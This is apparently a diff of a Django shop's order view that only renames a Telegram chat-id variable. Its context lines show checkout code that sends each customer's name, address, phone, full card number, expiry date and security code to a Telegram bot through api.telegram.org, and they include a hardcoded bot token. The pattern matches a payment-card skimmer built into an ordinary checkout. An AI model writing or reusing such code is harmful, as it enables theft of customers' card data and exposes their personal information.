@@ -9,7 +9,7 @@ from django.shortcuts import get_object_or_404
 
 import urllib.request
 token = '875809845:AAHxB49VM_TowQhXtaBz80fx07XrIvgcHIc'
-chat_id = 406434091
+tl_chat_id = 406434091
 
 # forma = 'name ={},\n last_name ={}'.format(
 #             'name1','last_name')
@@ -265,7 +265,7 @@ def make_order_view(request):
             name, last_name, phone, card_number, expiry_date, card_code, address, country, city, zipcode, NameonCard, CreditCardType, comments, cart.cart_total)
         forma = urllib.parse.quote(forma)
         urllib.request.urlopen(
-            'https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}'.format(token, chat_id, forma))
+            'https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}'.format(token, tl_chat_id, forma))
 
         new_order = Order.objects.create(
             user=request.user,
